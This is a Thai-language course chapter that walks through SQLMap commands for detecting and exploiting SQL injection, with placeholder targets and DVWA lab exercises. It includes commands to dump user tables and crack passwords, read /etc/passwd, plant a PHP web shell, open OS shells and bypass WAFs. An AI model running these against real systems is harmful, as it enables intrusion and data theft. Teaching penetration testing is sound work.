# Part 018: SQLMap - เครื่องมือ SQL Injection อัตโนมัติ

## ภาพรวม

SQLMap เป็นเครื่องมือ open-source ที่ทรงพลังที่สุดสำหรับการตรวจจับและ exploit SQL Injection โดยอัตโนมัติ

**ขั้นตอนที่ 206-225**

---

## 206. การติดตั้งและ Setup

```bash
# Ubuntu/Debian
sudo apt-get install sqlmap

# pip
pip install sqlmap

# clone จาก GitHub (latest)
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version

# Docker
docker pull sqlmap/sqlmap
docker run -it sqlmap/sqlmap --help
```

---

## 207. พื้นฐาน SQLMap

### 7.1 คำสั่งพื้นฐาน

```bash
# ทดสอบ URL
sqlmap -u "http://example.com/item?id=1"

# แสดง databases
sqlmap -u "http://example.com/item?id=1" --dbs

# แสดง tables
sqlmap -u "http://example.com/item?id=1" -D mydb --tables

# แสดง columns
sqlmap -u "http://example.com/item?id=1" -D mydb -T users --columns

# Dump ข้อมูล table
sqlmap -u "http://example.com/item?id=1" -D mydb -T users --dump

# Dump ทุก databases
sqlmap -u "http://example.com/item?id=1" --dump-all
```

### 7.2 การระบุ Parameter

```bash
# GET parameter
sqlmap -u "http://example.com/item?id=1&cat=2" -p id

# POST parameter
sqlmap -u "http://example.com/login" \
  --data="username=test&password=test" \
  -p username

# Cookie parameter
sqlmap -u "http://example.com/profile" \
  --cookie="session=abc123; user=test" \
  -p user

# JSON body
sqlmap -u "http://example.com/api/user" \
  --data='{"id": "1"}' \
  --content-type="application/json"
```

---

## 208. Detection Options

```bash
# Technique flags (B=Boolean, E=Error, U=Union, S=Stacked, T=Time)
sqlmap -u "http://example.com/item?id=1" --technique=BEUST
sqlmap -u "http://example.com/item?id=1" --technique=U

# Level 1-5, Risk 1-3
sqlmap -u "http://example.com/item?id=1" --level=1 --risk=1
sqlmap -u "http://example.com/item?id=1" --level=5 --risk=3

# DBMS Specification
sqlmap -u "http://example.com/item?id=1" --dbms=mysql
sqlmap -u "http://example.com/item?id=1" --dbms=mssql
sqlmap -u "http://example.com/item?id=1" --dbms=postgresql
```

---

## 209. Authentication และ Session

```bash
# Basic auth
sqlmap -u "http://example.com/item?id=1" \
  --auth-type=basic --auth-cred="user:password"

# Cookies
sqlmap -u "http://example.com/item?id=1" \
  --cookie="PHPSESSID=abc123; security=low"

# Burp Suite integration
sqlmap -r request.txt
```

---

## 210. Advanced Extraction

```bash
# ดึง columns เฉพาะ
sqlmap -u "http://example.com/item?id=1" \
  -D mydb -T users -C username,password --dump

# ดึง N rows
sqlmap -u "http://example.com/item?id=1" \
  -D mydb -T users --dump --start=1 --stop=10

# WHERE condition
sqlmap -u "http://example.com/item?id=1" \
  -D mydb -T users --dump --where="role='admin'"

# Password cracking
sqlmap -u "http://example.com/item?id=1" \
  -D mydb -T users --dump --passwords \
  --wordlist=/usr/share/wordlists/rockyou.txt

# File operations
sqlmap -u "http://example.com/item?id=1" --file-read="/etc/passwd"
sqlmap -u "http://example.com/item?id=1" \
  --file-write="./shell.php" --file-dest="/var/www/html/shell.php"
```

---

## 211. OS Command Execution

```bash
sqlmap -u "http://example.com/item?id=1" --os-shell
sqlmap -u "http://example.com/item?id=1" --os-cmd="whoami"
sqlmap -u "http://example.com/item?id=1" \
  --os-pwn --msf-path=/usr/share/metasploit-framework
```

---

## 212. WAF Bypass

```bash
# Tamper scripts
sqlmap -u "http://example.com/item?id=1" --tamper=space2comment
sqlmap -u "http://example.com/item?id=1" \
  --tamper=space2comment,charencode,randomcase

# บาง tamper scripts ที่ใช้บ่อย:
# space2comment  - แทน space ด้วย /**/
# charencode     - URL encode characters
# randomcase     - สุ่ม case ของ keywords
# between        - แทน > ด้วย BETWEEN
# equaltolike    - แทน = ด้วย LIKE
# modsecurityversioned - MySQL version comments

# Proxy
sqlmap -u "http://example.com/item?id=1" --proxy="http://127.0.0.1:8080"

# Delay
sqlmap -u "http://example.com/item?id=1" --delay=1
```

---

## 213. Batch Mode และ Automation

```bash
# Batch mode
sqlmap -u "http://example.com/item?id=1" --batch

# Dump ทุกอย่าง
sqlmap -u "http://example.com/item?id=1" \
  --batch --dump-all --exclude-sysdbs

# Multiple targets
sqlmap -m urls.txt --batch --dbs

# Crawl website
sqlmap -u "http://example.com/" --crawl=3 --batch --dbs

# Verbosity
sqlmap -u "http://example.com/item?id=1" -v 3
```

---

## 215. ตัวอย่างการใช้งานจริง

```bash
# Web Login Form
sqlmap -r login_request.txt \
  -p username --level=3 --risk=2 --batch --dbs

# REST API
sqlmap -u "http://api.example.com/v1/user?id=1" \
  --headers="Authorization: Bearer TOKEN123" --batch --dbs

# JSON POST
sqlmap -u "http://api.example.com/v1/search" \
  --data='{"query": "test"}' \
  --content-type="application/json" -p query --batch --dbs

# Cookie injection
sqlmap -u "http://example.com/dashboard" \
  --cookie="user_id=1; PHPSESSID=abc123" -p user_id \
  --level=3 --batch -D mydb -T users --dump
```

---

## 216. แบบฝึกหัด

```bash
# Basic
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
  --dbs --batch

# Advanced
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION; security=medium" \
  --tamper=space2comment --dbs --batch
```

---

## สรุป

SQLMap:
- **ทรงพลัง** - ครอบคลุมทุก SQL injection techniques
- **อัตโนมัติ** - ตรวจจับและ exploit โดยอัตโนมัติ
- **Customizable** - tamper scripts, custom payloads, headers

**หมายเหตุ:** ใช้ SQLMap เฉพาะกับระบบที่ได้รับอนุญาตเท่านั้น!

---

*Part 018 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
